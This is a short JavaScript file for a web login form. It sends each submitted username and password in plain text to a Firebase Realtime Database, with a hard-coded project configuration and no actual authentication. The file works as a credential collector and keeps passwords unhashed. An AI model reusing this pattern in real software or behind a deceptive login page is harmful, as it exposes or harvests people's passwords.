const firebaseConfig = {
    apiKey: "AIzaSyCFHMxivqGerOX7zxd5OjViREDJx2xA4cE",
    authDomain: "loginform-81d1a.firebaseapp.com",
    databaseURL: "https://loginform-81d1a-default-rtdb.firebaseio.com",
    projectId: "loginform-81d1a",
    storageBucket: "loginform-81d1a.appspot.com",
    messagingSenderId: "1017809985435",
    appId: "1:1017809985435:web:6f4406d1f7819dbcae0b3e"
  };

  //initialize firebase
firebase.initializeApp(firebaseConfig);

//reference for database
var LoginFormDB= firebase.database().ref('LoginForm');

document.getElementById('loginForm').addEventListener('submit',submitForm);

function submitForm(e){
    e.preventDefault();

    var name=getElementVal('username');
    var password=getElementVal('userpass');

    //console.log(name,password);
    saveMessages(name,password);

    //enable the alert
    document.querySelector('.alert').style.display="block";

    //remove the alert
    setTimeout(()=>{
        document.querySelector('.alert').style.display="none";
    },3000);

    //reset the form
    document.getElementById('loginForm').reset();
}

const saveMessages=(name,password)=>{
    var newLoginForm = LoginFormDB.push();
    newLoginForm.set({
        name:name,
        password:password,
    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
}